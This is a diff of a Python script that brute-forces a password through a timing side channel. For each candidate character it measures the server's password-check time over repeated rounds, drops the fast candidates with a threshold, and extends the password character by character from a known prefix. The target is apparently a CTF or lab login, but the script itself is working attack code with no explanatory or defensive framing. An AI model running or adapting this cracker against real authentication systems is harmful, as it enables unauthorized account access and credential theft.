@@ -27,12 +27,12 @@ class SuccessfulPasswordException(Exception):  # exceptions are totally for succ
     pass
 
 
-def try_passwords(prefix):
+def try_passwords(plist):
     timings = {}
-    chrs = printable_no_ws | {" "}
+    prefixes = printable_no_ws | {" "}
 
-    for chunk in chunks(sorted(chrs), 8):
-        for pw, header_time_ns, un_time_ns, pw_time_ns, succ in try_password_list([prefix+c for c in chunk]):
+    for chunk in chunks(plist, 8):
+        for pw, header_time_ns, un_time_ns, pw_time_ns, succ in try_password_list([c for c in chunk]):
             timings[pw] = header_time_ns, un_time_ns, pw_time_ns,
             if succ == "true":
                 print("Successful password??", pw)
@@ -41,20 +41,24 @@ def try_passwords(prefix):
     return timings
 
 
-def try_passwords_ntimes(prefix, ntimes=10):
-    best_timings = defaultdict(lambda: 0xffffffffffffffffffffffffffff)
-    full_data = defaultdict(list)
+def try_passwords_ntimes(prefix, ntimes=10, best_timings=None, full_data=None, pwds=None):
+    if pwds is None:
+        chrs = sorted(printable_no_ws | {" "} )
+        pwds = [prefix+c for c in chrs]
+    if best_timings is None:
+        best_timings = {pw:0xffffffffffffffffffffffffffffff  for pw in pwds}
+    if full_data is None:
+        full_data = defaultdict(list)
 
     for i in range(ntimes):
         print(f"=== Iteration {i} ===")
-        timings = try_passwords(prefix)
+        timings = try_passwords(pwds)
         for pw, dt in timings.items():
             pw_time = dt[2]
             best_timings[pw] = min(best_timings[pw], pw_time)
             full_data[pw].append(dt)
 
     print(sorted(best_timings.items(), key=lambda kv: kv[1]))
-
     return dict(best_timings), dict(full_data)
 
 
@@ -62,7 +66,15 @@ def crack_password(prefix, ntimes=10):
     pw = prefix
     while len(pw) < 10:
         try:
-            best_timings, full_data = try_passwords_ntimes(pw, ntimes)
+            best_timings, full_data = None,None
+            chrs = sorted(printable_no_ws | {" "} )
+            pwds = [pw+c for c in chrs]
+            for i in range(ntimes):
+                best_timings, full_data = try_passwords_ntimes(pw, ntimes=1,best_timings=best_timings, full_data=full_data,pwds=pwds)
+                timingsSrt = sorted(best_timings.items(), key=lambda kv: kv[1])
+                threshold = timingsSrt[0][1] + (timingsSrt[-1][1] - timingsSrt[0][1])/5
+                pwds = [k for k,v in best_timings.items() if v>threshold]
+
         except SuccessfulPasswordException as e:
             return e.args[1]
 
@@ -89,4 +101,4 @@ def crack_password(prefix, ntimes=10):
                             snd_slowest_pw, snd_slowest_t, fastest_pw, fastest_t, rng, best_dif)
 
 
-crack_password("se")
+crack_password("sepi")
